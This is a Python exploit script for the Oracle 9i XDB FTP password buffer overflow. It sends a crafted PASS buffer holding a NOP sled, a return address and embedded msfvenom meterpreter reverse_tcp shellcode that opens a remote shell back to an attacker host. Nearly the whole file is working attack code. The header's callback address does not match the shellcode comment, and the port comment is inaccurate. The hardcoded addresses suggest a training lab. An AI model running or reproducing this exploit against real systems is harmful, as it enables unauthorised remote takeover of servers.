#!/usr/bin/python
## oracle_xdb_ftp_pass-exploit.py
##
## Exploits Oracle 9i XDB ftp password buffer overflow vulnerability
##   -> http://www.blackhat.com/presentations/bh-usa-03/bh-us-03-litchfield-paper.pdf
##
## Spawns a reverse meterpreter shell to 192.168.192.14:443
##
## Author Re4son <re4son [at] whitedome.com.au>
##
## TODO: adjust 
##		- rhost to point to the right target
##		- rport to use the right port
##
## Execution: python oracle_xdb_ftp_pass-exploit.py

import sys, socket, random, string


rhost = "10.11.1.202" 		# Target IP address
rport = 2100				# Target Port, can be 135, 137, 445


## Return addresses according to metasploit:
##
##   0x60616d46		oraclient9.dll (pop/pop/ret)



ret = "\x46\x6d\x61\x60"			## Return address (Little Endian)



nops = "\x90" *(800-308-7)			## to fill 800

prependencoder = "\x81\xc4\xff\xef\xff\xff\x44"	## following the NOP sled, but before the decoder machine code

# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.254 LPORT=443 EXITFUNC=thread -a x86 --platform Windows  -b \x00\x09\x0a\x0d\x20\x22\x25\x26\x27\x2b\x2f\x3a\x3c\x3e\x3f\x40 -f python -v shellcode
shellcode =  ""
shellcode += nops
shellcode += prependencoder
shellcode += "\x33\xc9\x83\xe9\xa5\xe8\xff\xff\xff\xff\xc0\x5e"
shellcode += "\x81\x76\x0e\x88\xaa\x9b\x8f\x83\xee\xfc\xe2\xf4"
shellcode += "\x74\x42\x19\x8f\x88\xaa\xfb\x06\x6d\x9b\x5b\xeb"
shellcode += "\x03\xfa\xab\x04\xda\xa6\x10\xdd\x9c\x21\xe9\xa7"
shellcode += "\x87\x1d\xd1\xa9\xb9\x55\x37\xb3\xe9\xd6\x99\xa3"
shellcode += "\xa8\x6b\x54\x82\x89\x6d\x79\x7d\xda\xfd\x10\xdd"
shellcode += "\x98\x21\xd1\xb3\x03\xe6\x8a\xf7\x6b\xe2\x9a\x5e"
shellcode += "\xd9\x21\xc2\xaf\x89\x79\x10\xc6\x90\x49\xa1\xc6"
shellcode += "\x03\x9e\x10\x8e\x5e\x9b\x64\x23\x49\x65\x96\x8e"
shellcode += "\x4f\x92\x7b\xfa\x7e\xa9\xe6\x77\xb3\xd7\xbf\xfa"
shellcode += "\x6c\xf2\x10\xd7\xac\xab\x48\xe9\x03\xa6\xd0\x04"
shellcode += "\xd0\xb6\x9a\x5c\x03\xae\x10\x8e\x58\x23\xdf\xab"
shellcode += "\xac\xf1\xc0\xee\xd1\xf0\xca\x70\x68\xf5\xc4\xd5"
shellcode += "\x03\xb8\x70\x02\xd5\xc2\xa8\xbd\x88\xaa\xf3\xf8"
shellcode += "\xfb\x98\xc4\xdb\xe0\xe6\xec\xa9\x8f\x23\x73\x70"
shellcode += "\x58\x12\x0b\x8e\x88\xaa\xb2\x4b\xdc\xfa\xf3\xa6"
shellcode += "\x08\xc1\x9b\x70\x5d\xc0\x91\xe7\x82\xa1\x9b\x71"
shellcode += "\xe0\xa8\x9b\x8e\x33\x23\x7d\xdf\xd8\xfa\xcb\xcf"
shellcode += "\xd8\xea\xcb\xe7\x62\xa5\x44\x6f\x77\x7f\x0c\xe5"
shellcode += "\x98\xfc\xcc\xe7\x11\x0f\xef\xee\x77\x7f\x1e\x4f"
shellcode += "\xfc\xa0\x64\xc1\x80\xdf\x77\x67\xef\xaa\x9b\x8f"
shellcode += "\xe2\xaa\xf1\x8b\xde\xfd\xf3\x8d\x51\x62\xc4\x70"
shellcode += "\x5d\x29\x63\x8f\xf6\x9c\x10\xb9\xe2\xea\xf3\x8f"
shellcode += "\x98\xaa\x9b\xd9\xe2\xaa\xf3\xd7\x2c\xf9\x7e\x70"
shellcode += "\x5d\x39\xc8\xe5\x88\xfc\xc8\xd8\xe0\xa8\x42\x47"
shellcode += "\xd7\x55\x4e\x0c\x70\xaa\xe6\xa7\xd0\xc2\x9b\xcf"
shellcode += "\x88\xaa\xf1\x8f\xd8\xc2\x90\xa0\x87\x9a\x64\x5a"
shellcode += "\xdf\xc2\xee\xe1\xc5\xcb\x64\x5a\xd6\xf4\x64\x83"
shellcode += "\xac\xa5\x1e\xff\x77\x55\x64\x66\x13\x55\x64\x70"
shellcode += "\x89\x69\xb2\x49\xfd\x6b\x58\x34\x68\xb7\xb1\x85"
shellcode += "\xe0\x0c\x0e\x32\x15\x55\x4e\xb3\x8e\xd6\x91\x0f"
shellcode += "\x73\x4a\xee\x8a\x33\xed\x88\xfd\xe7\xc0\x9b\xdc"
shellcode += "\x77\x7f\x9b\x8f"

user = "".join( [random.choice(string.uppercase) for i in xrange(10)] )				## 10 random uppercase characters

passwd = "".join( [random.choice(string.uppercase) for i in xrange(442)] )			## 442 random uppercase characters
jmp_short = "\xEB\x06"										## Short jump (\xEB) to an offset of 6 (\x06) according to metasploit (Rex::Arch::X86.jmp_short(6))		
two_nops  = "\x90\x90"										## Two NOP's


## Let's build the exploit that is send as password

buffer = passwd + jmp_short + two_nops + ret + shellcode


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	print "\nConnecting..."
	s.connect((rhost,rport))
	data = s.recv(1024)
	s.send('USER' + user +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\nDone!"
	s.close
except:
	print "Could not connect to " + rhost + ":" + str(rport) + "!"

